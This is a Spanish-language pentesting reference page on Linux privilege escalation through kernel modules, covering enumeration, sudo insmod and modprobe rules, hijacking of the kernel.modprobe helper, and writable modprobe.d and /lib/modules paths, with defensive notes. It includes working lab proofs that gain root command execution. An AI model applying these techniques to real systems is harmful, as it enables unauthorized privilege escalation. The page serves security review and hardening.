# Abuso de Kernel Modules y modprobe

{{#include ../../banners/hacktricks-training.md}}

## Errores de configuración de Kernel Modules y carga de módulos

La compatibilidad con Kernel Modules es un área de alto impacto durante la revisión de privilege escalation en Linux. No consideres explotable por sí solo cada mensaje sobre módulos sin firmar, pero úsalo para responder preguntas prácticas.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- ¿Puede el usuario actual cargar módulos mediante `sudo`, capabilities o una ruta de helper con permisos de escritura?
- ¿La carga de módulos sigue habilitada?
- ¿La verificación de firmas de módulos está deshabilitada?
- ¿Los directorios de módulos, los archivos de módulos o las rutas de configuración de `modprobe.d` tienen permisos de escritura?<sup>[[16]](#references)</sup>
- ¿Se pueden leer los logs del kernel para confirmar lo ocurrido?

El triage rápido comienza con las siguientes comprobaciones del estado de los módulos, las firmas, el logging y el árbol de módulos.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretación:

- `modules_disabled=1` significa que los módulos no se pueden cargar ni descargar, y el valor no se puede restablecer a `0` hasta reiniciar.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` en la línea de comandos del kernel o `CONFIG_MODULE_SIG_FORCE=y` requiere módulos firmados válidamente; de lo contrario, los módulos sin firmar pueden cargarse y marcar el kernel como comprometido.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` no impone ninguna restricción sobre `dmesg`; cuando es `1`, el acceso requiere `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Las rutas escribibles bajo `/lib/modules/$(uname -r)/` son peligrosas porque `modprobe` busca en ese árbol y en sus datos de dependencias al cargar módulos.<sup>[[8]](#references)</sup>

### Cargar un módulo y leer la salida del kernel

Si tienes permiso legítimo para cargar un módulo local, `insmod` inserta el archivo `.ko` exacto que proporciones. La función de inicialización del módulo se ejecuta como parte de la carga, y los mensajes escritos con `printk()` van al búfer de logs del kernel, que normalmente se lee con `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Un flujo de revisión mínimo usa `modinfo` para inspeccionar los metadatos, `insmod` y `rmmod` para cargar y eliminar un módulo, `lsmod` para confirmar su estado de carga y `dmesg` para inspeccionar los logs del kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Si `sudo -l` permite ejecutar `insmod`, `modprobe` o un wrapper que los utilice, considéralo crítico: `sudo -l` muestra los privilegios del usuario que invoca el comando, y cargar un módulo del kernel requiere `CAP_SYS_MODULE`. Consulta [capacidades de Linux](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) para conocer rutas directas basadas en capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### `insmod` permitido mediante Sudo

Una regla de Sudo que permite a un usuario ejecutar `insmod` no es comparable con permitir un helper administrativo normal. El código de inicialización del módulo se ejecuta como parte de la inserción, por lo que la pregunta práctica de la revisión es si este usuario puede elegir o modificar el módulo que se está cargando.<sup>[[3]](#references)</sup>

El siguiente flujo de revisión genérico repite esas comprobaciones de inspección, carga, estado, registro y eliminación para un módulo candidato.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Si el usuario puede proporcionar un `.ko` arbitrario, la regla debe tratarse como un compromiso total del sistema en una evaluación autorizada. Un patrón operativo más seguro consiste en evitar delegar la carga de módulos mediante sudo; si es inevitable, restrinja la ruta exacta, la propiedad, los permisos, la política de firmas y el flujo de trabajo de eliminación.<sup>[[3]](#references)[[10]](#references)</sup>

Para un patrón inofensivo de compilación de módulos en un laboratorio controlado, a continuación se muestran un código fuente mínimo y un Makefile; la forma `make -C /lib/modules/$(uname -r)/build M=$PWD` sigue el flujo de trabajo kbuild documentado por el kernel para módulos externos.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Compila y carga solo en un laboratorio autorizado; kbuild compila el módulo externo y los comandos de carga/eliminación invocan las interfaces de módulos del kernel.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Comprobaciones de abuso de `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` especifica el helper de userspace que el kernel ejecuta para las solicitudes de autoload de módulos; este sysctl afecta a la carga automática, no a la inserción explícita de módulos. Si un atacante puede cambiarlo para que apunte a una ruta de un ejecutable modificable y desencadenar una solicitud de módulo, ese helper se convierte en una vía de ejecución de código con privilegios. Establecerlo en una cadena vacía deshabilita las solicitudes de autoload; si `CONFIG_STATIC_USERMODEHELPER=y`, un valor no vacío se reemplaza por la ruta del helper estático compilado en el kernel.<sup>[[1]](#references)</sup>

Comprueba la ruta actual del helper mediante la interfaz sysctl del kernel e inspecciona la propiedad y los permisos del objetivo.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Comprueba si se puede influir en el sysctl, las reglas sudo delegadas o las capacidades de archivo.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
El siguiente patrón exclusivo de laboratorio cambia la ruta del helper y activa una solicitud documentada de carga automática de módulos; úsalo únicamente en un sistema aislado y autorizado.<sup>[[1]](#references)</sup>

En los kernels Linux actuales, no uses un ejecutable desconocido como disparador genérico: la carga automática heredada de módulos para formatos binarios personalizados se eliminó en Linux 6.14, mientras que la documentación del kernel identifica un tipo de sistema de archivos desconocido como una ruta de solicitud de carga automática de módulos.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
En sistemas hardened, esto debería fallar cuando los permisos impidan las escrituras no privilegiadas en `kernel.modprobe`, la ruta del helper no sea escribible o la carga automática de módulos esté deshabilitada.<sup>[[1]](#references)</sup>

### Configuración escribible de `modprobe.d` y `sudo modprobe -C`

Antes de resolver un módulo, `modprobe` lee archivos `.conf` de directorios de configuración como `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` y `/lib/modprobe.d`, en orden de precedencia. Un archivo con el mismo nombre en un directorio de mayor prioridad oculta al archivo del directorio de menor prioridad. Más importante aún, una directiva `install <module> <command>` ejecuta un comando arbitrario de shell **en lugar de** insertar ese módulo. Por lo tanto, una ruta de configuración escribible puede convertirse en una ejecución de comandos diferida bajo las credenciales de un invocador posterior de `modprobe` con privilegios; la aplicación de firmas de módulos del kernel no autentica este comando en el espacio de usuario.<sup>[[16]](#references)</sup>

Audita los permisos de directorios y archivos y, a continuación, inspecciona la configuración efectiva. `modprobe -n -v` es seguro para revisar la resolución porque el modo dry-run no inserta el módulo ni ejecuta un comando `install`/`remove`. Prefiere `modprobe -c` a la forma heredada `--showconfig`, que la documentación actual de kmod marca para su eliminación después de kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
[ -e "$d" ] || continue
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
/etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
/usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```
Una regla de sudo sin restricciones para `modprobe` es explotable incluso cuando los archivos `.ko` arbitrarios no pueden superar la verificación de firmas: `-C` selecciona un directorio de configuración controlado por el atacante, desde el cual el proceso iniciado por sudo puede ejecutar un comando `install`.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```
Para la mitigación, no concedas `modprobe` con argumentos sin restricciones mediante sudo, mantén todos los directorios de configuración bajo propiedad de root y sin permisos de escritura, y revisa las directivas `install`/`remove` inesperadas. Cuando un flujo de trabajo administrativo de confianza deba omitir dichas directivas para un módulo, `modprobe --ignore-install` las ignora para ese módulo concreto, pero las dependencias aún pueden tener sus propios comandos.<sup>[[8]](#references)[[16]](#references)</sup>

### Revisión de `/lib/modules` con permisos de escritura

Los directorios de módulos con permisos de escritura pueden permitir la sustitución de módulos, la instalación de módulos maliciosos o el abuso de la carga automática, dependiendo de cómo se invoque posteriormente `modprobe`; `modprobe` busca en `/lib/modules/$(uname -r)` y utiliza sus datos de dependencias al resolver módulos.<sup>[[8]](#references)</sup>

Revisa los archivos de módulos con permisos de escritura y los metadatos de dependencias/alias en el árbol de módulos de la versión activa del kernel.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Si encuentras contenido de módulos con permisos de escritura, inspecciona cómo `modprobe` resuelve las dependencias y cómo `modinfo` informa sobre los metadatos de los módulos.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Notas defensivas:

- Mantén `/lib/modules` propiedad de `root:root` y no escribible por los usuarios.<sup>[[8]](#references)</sup>
- Establece `kernel.modules_disabled=1` después del arranque cuando sea operativamente posible.<sup>[[1]](#references)</sup>
- Aplica la firma de módulos en los sistemas que requieran módulos cargables.<sup>[[2]](#references)</sup>
- Supervisa las escrituras en `/proc/sys/kernel/modprobe`, `/lib/modules` y los directorios de configuración `modprobe.d`, además de la ejecución inesperada de `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## References

- [1] [Documentación de /proc/sys/kernel/ — Documentación del kernel de Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Mecanismo de firma de módulos del kernel — Documentación del kernel de Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Página del manual de Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Conceptos básicos de los drivers — Documentación del kernel de Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Registro de mensajes con printk — Documentación del kernel de Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Compilación de módulos externos — Documentación del kernel de Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Página del manual de Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Fusionar la etiqueta 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Página del manual de Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
